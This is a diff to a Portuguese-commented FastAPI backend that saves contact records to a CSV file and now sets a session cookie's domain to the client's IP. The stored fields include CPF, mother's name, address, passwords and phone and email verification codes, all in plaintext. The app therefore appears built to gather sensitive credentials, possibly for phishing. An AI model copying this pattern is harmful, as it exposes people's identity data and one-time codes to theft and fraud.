@@ -1,4 +1,4 @@
-from fastapi import FastAPI, HTTPException, Cookie, Response
+from fastapi import FastAPI, HTTPException, Cookie, Response, Request
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import pandas as pd
@@ -20,7 +20,7 @@ app.add_middleware(
     allow_headers=["*"],  # Permite todos os cabeçalhos
 )
 
-CSV_FILE_PATH = "var/data/contacts.csv"
+CSV_FILE_PATH = "/var/data/contacts.csv"
 CSV_COLUMNS = [
     "id", "name", "email", "mae", "telefone", "endereco", "geo", "cep",
     "cpf", "nascimento", "data", "ip", "senha", "codigo_telefone", "codigo_email"
@@ -87,7 +87,7 @@ def write_contacts(contacts: list):
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/start")
-def start_contact(contact: ContactStart, response: Response):
+def start_contact(contact: ContactStart, response: Response, request: Request):
     ensure_csv_exists()
     try:
         # Consulta a API externa com o CPF
@@ -129,7 +129,14 @@ def start_contact(contact: ContactStart, response: Response):
         df.to_csv(CSV_FILE_PATH, index=False)
 
         # Configurar cookie para manter a sessão
-        response.set_cookie(key="session_id", value=new_id, httponly=True, max_age=300)  # Cookie expira em 5 minutos
+        response.set_cookie(
+            key="session_id",
+            value=new_id,
+            httponly=True,
+            max_age=300,  # Cookie expira em 5 minutos
+            domain=request.client.host,  # Domínio do cookie
+            path="/"  # Caminho do cookie
+        )
 
         return {"message": "Session started successfully"}
     except requests.exceptions.RequestException as e:
